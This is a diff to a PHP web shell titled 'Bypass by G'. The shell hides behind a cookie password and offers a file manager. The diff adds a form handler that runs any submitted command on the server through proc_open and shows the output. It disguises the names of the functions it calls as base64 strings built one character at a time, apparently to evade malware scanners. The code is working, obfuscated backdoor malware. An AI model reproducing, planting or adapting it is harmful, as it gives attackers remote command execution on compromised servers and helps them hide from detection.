@@ -212,8 +212,8 @@ if (!isset($_COOKIE['loggedin']) || $_COOKIE['loggedin'] !== $correct_password_h
         <h1>Bypass by G</h1>
         <div class="command-section">
             <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
-                <label for="cmd_biasa">Run Command:</label>
-                <input type="text" name="cmd_biasa" id="cmd_biasa" placeholder="Enter command">
+                <label for="c0m4nd">Run Command:</label>
+                <input type="text" name="c0m4nd" id="c0m4nd" placeholder="Enter command">
                 <input type="submit" value="Run Command">
             </form>
         </div>
@@ -284,6 +284,36 @@ if (!isset($_COOKIE['loggedin']) || $_COOKIE['loggedin'] !== $correct_password_h
                 $newFile = $currentDirectory . '/' . $_POST['file_name'];
                 file_put_contents($newFile, '');
             }
+            if (isset($_POST['c0m4nd'])) {
+                $command = $_POST['c0m4nd'];
+                $descriptorspec = [
+                    0 => ['pipe', 'r'],
+                    1 => ['pipe', 'w'],
+                    2 => ['pipe', 'w']
+                ];
+            
+                $p_r_o_c___o_p_e_n = base64_decode('c' . 'H' . 'J' . 'v' . 'Y' . '1' . '9' . 'v' . 'c' . 'G' . 'V' . 'u');
+                $f_c_l_o_s_e = base64_decode('Z' . 'm' . 'N' . 's' . 'b' . '3' . 'N' . 'l');
+                $p_r_o_c___c_l_o_s_e = base64_decode('c' . 'H' . 'J' . 'v' . 'Y' . '1' . '9' . 'j' . 'b' . 'G' . '9' . 'z' . 'Z' . 'Q' . '==');
+                $s_t_r_e_a_m___g_e_t___c_o_n_t_e_n_t_s = base64_decode('c' . '3' . 'R' . 'y' . 'Z' . 'W' . 'F' . 't' . 'X' . '2' . 'd' . 'l' . 'd' . 'F' . '9' . 'j' . 'b' . '2' . '5' . '0' . 'Z' . 'W' . '5' . '0' . 'c' . 'w' . '==');
+            
+                $process = $p_r_o_c___o_p_e_n($command, $descriptorspec, $pipes);
+                if (is_resource($process)) {
+                    $output = $s_t_r_e_a_m___g_e_t___c_o_n_t_e_n_t_s($pipes[1]);
+                    $errors = $s_t_r_e_a_m___g_e_t___c_o_n_t_e_n_t_s($pipes[2]);
+                    $f_c_l_o_s_e($pipes[1]);
+                    $f_c_l_o_s_e($pipes[2]);
+                    $p_r_o_c___c_l_o_s_e($process);
+                    if (!empty($errors)) {
+                        echo '<hr><p>Error: </p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
+                    } else {
+                        echo '<hr><p>Result: </p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
+                    }
+                } else {
+                    echo 'Result:</p><textarea class="result-box">Error: Failed to execute command! </textarea>';
+                }
+            }
+            
 
             if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['view_file'])) {
                 $currentDirectory = realpath($_POST['current_directory']);
